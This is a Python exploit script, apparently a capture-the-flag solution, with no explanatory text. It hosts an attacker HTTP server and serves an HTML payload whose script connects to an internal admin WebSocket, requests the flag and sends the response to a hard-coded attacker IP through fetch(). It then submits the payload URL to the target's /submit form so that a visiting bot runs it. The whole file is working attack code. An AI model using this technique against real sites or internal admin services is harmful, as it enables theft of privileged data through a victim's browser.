from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
import time
import requests

ATTACKER_HOST = "188.121.120.54"  
ATTACKER_PORT = 8585
TARGET = "http://185.205.203.123:1202"

EXPLOIT_HTML = f"""<!DOCTYPE html>
<html><body><script>
const ws = new WebSocket('ws://web:8080/admin/ws');
ws.onopen = () => ws.send('flag');
ws.onmessage = (e) => {{
    fetch('http://{ATTACKER_HOST}:{ATTACKER_PORT}/?f=' + encodeURIComponent(e.data));
}};
</script></body></html>
"""

captured_flag = None


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        global captured_flag
        parsed = urlparse(self.path)

        if parsed.path == "/exploit.html":
            body = EXPLOIT_HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        elif parsed.path == "/":
            params = parse_qs(parsed.query)
            if "f" in params:
                captured_flag = params["f"][0]
                print(f"\n[+] FLAG: {captured_flag}\n")
            self.send_response(200)
            self.end_headers()

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        print(f"[http] {self.address_string()} {fmt % args}")


def submit(url):
    try:
        r = requests.post(f"{TARGET}/submit", data={"url": url}, allow_redirects=True, timeout=10)
        if "librarian" in r.text or "Thank you" in r.text:
            print(f"[+] URL submitted: {url}")
        else:
            print(f"[?] Status {r.status_code} — check manually")
    except Exception as e:
        print(f"[-] Submit error: {e}")


exploit_url = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}/exploit.html"

srv = HTTPServer(("0.0.0.0", ATTACKER_PORT), Handler)
t = threading.Thread(target=srv.serve_forever, daemon=True)
t.start()
print(f"[*] Server listening on 0.0.0.0:{ATTACKER_PORT}")

time.sleep(0.5)
submit(exploit_url)

print("[*] Waiting for flag (max 90s) ...")
deadline = time.time() + 90
while time.time() < deadline:
    if captured_flag:
        break
    time.sleep(1)
else:
    print("[-] Timed out — check server logs above")
